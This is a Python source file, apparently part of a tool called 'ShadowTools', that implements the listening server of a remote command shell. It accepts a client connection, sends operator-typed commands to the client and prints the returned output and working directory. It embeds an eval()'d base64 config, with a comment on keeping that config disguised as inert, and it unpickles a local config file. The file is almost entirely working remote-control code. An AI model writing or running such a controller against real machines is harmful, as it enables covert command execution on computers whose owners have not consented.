#!python3
# -*- coding: utf-8 -*-
########################################
# Server.py
#	new draft for server python shell
#
########################################
#
SoftName="ShadowTools-Server"
ENCODED_CONFIG='null=='#/ENCODEDCONF
#
########################################
#		TO DO / IDEAS: 
# add file transfer to client
# first send file size and hash, to double check integrity
#
#
########################################
# IMPORTS
########################################
#
# pickle for saving/loading local config files
import pickle
# socket for connecting to the server
import socket
# base64 for encoding/decoding of the config
from base64 import b64decode
# /imports


# LOAD CONFIG
def LoadConfig():
	#
	# PARSE CONFIG
	def ParseConfig(ENCODED_CONFIG):
		# this takes in the base64 string and first base64 decodes it into a bytes object?
		CONFIG=b64decode(ENCODED_CONFIG)
		# that object is further decode()'d into a string, then eval()'d into a dict
		try:
			CONFIG=eval(CONFIG.decode())
		except:
			return "broken"
		# this print line could be commented out, or put behind a DEBUG if()
		print(CONFIG)
		# lastly we yield the CONFIG dict that was decoded from the embedded config
		return CONFIG
	# /ParseConfig
	#
	# LoadConfig will first try to load the ENCODED_CONFIG if there is one present
	# if the encoded config is not the default/empty "null" then try to parse it
	# using the above defined function. this could be behind a try:/except: for error handling
	# in case the config is corrupt and unloadable as a dict
	#	as long as the CONFIG embed *starts* with 'null' it will appear empty.
	#	so you could have one line a='null >>realbase64stringhere' and it would be inert
	CONFIG='null'
	if(ENCODED_CONFIG[0:4]!="null"):
		try:
			CONFIG=ParseConfig(ENCODED_CONFIG)
			if(CONFIG=="broken"):
				raise
		except:
			CONFIG="null"
	if(CONFIG=="null"):
		# if that did not work, then we try to open a .shadow config file (pickle)
		shadowpath='./Server.shadow'
		try:
			# Load config file, if there is one
			with open(shadowpath, 'rb') as file:
				CONFIG = pickle.load(file)
				print("Configuration loaded!")
		except:
			# finally we Load defaults, if no config file exists
			CONFIG	=	{
			"SERVER_HOST"	:	'FF.FF.FF.FF', 		#host ip
			"SERVER_PORT"	:	1189,				# 
			"BUFFER_SIZE"	:	1024 * 128,			# 128KB max size of messages, feel free to increase
			"SEPARATOR"		:	"<sep>",			# separator string for sending 2 messages in one go
			"mode"			:	"auto",				# 
					}
		# yeild the configuration as the product of this function
	return CONFIG
# /LoadConfig


# SERVER
def Server(CONFIG):
	# by the time this code is executed, the script is running, but not yet connected to anything
	#
	# under manual mode, it will stop and ask for confirmation.
	# this is useful to test config but send no packets (radio silent)
	if(CONFIG["mode"]=="manual"):
		confirmation=input("connect to "+str(CONFIG["SERVER_HOST"])+":"+str(CONFIG["SERVER_PORT"])+"? \n >> ")
		if(confirmation=="y" or confirmation=="yes"):
			pass
		else:
			running=False
			return
	else:
		# in the event of automatic mode, it will just print the connection details,
		# without waiting for any input.
		print("connecting to "+str(CONFIG["SERVER_HOST"])+":"+str(CONFIG["SERVER_PORT"]))
	# create a socket object
	s = socket.socket()
	# bind the socket to all IP addresses of this host
	s.bind((CONFIG["SERVER_HOST"], CONFIG["SERVER_PORT"]))
	s.listen(5)
	print(f"Listening as {CONFIG['SERVER_HOST']}:{CONFIG['SERVER_PORT']} ...")
	# accept any connections attempted
	client_socket, client_address = s.accept()
	print(f"{client_address[0]}:{client_address[1]} Connected!")
	# receiving the current working directory of the client
	cwd = client_socket.recv(CONFIG["BUFFER_SIZE"]).decode()
	print("[+] Current working directory:", cwd)
	
	while True:
		# get the command from prompt
		command = input(f"{cwd} $> ")
		if not command.strip():
			# empty command
			continue
		# send the command to the client
		client_socket.send(command.encode())
		if command.lower() == "exit":
			# if the command is exit, just break out of the loop
			break
		# retrieve command results
		output = client_socket.recv(CONFIG["BUFFER_SIZE"]).decode()
		# split command output and current directory
		results, cwd = output.split(CONFIG["SEPARATOR"])
		# print output
		print(results)
# /Server




# IF this script is launched as primary, then code executes,
#	keeping any execution of code in a block like this,
#	makes the script able to be read by another script as an import,
# 	so we can combine assets from multiple scripts
if __name__ == '__main__':
	#
	# LoadConfig renders the CONFIG for us to use
	CONFIG=LoadConfig()
	# Launch this script with our CONFIG
	Server(CONFIG)
#
# 
##################################################
#             S H A D O W    T O O L             #
##################################################
# End Of File: Server.py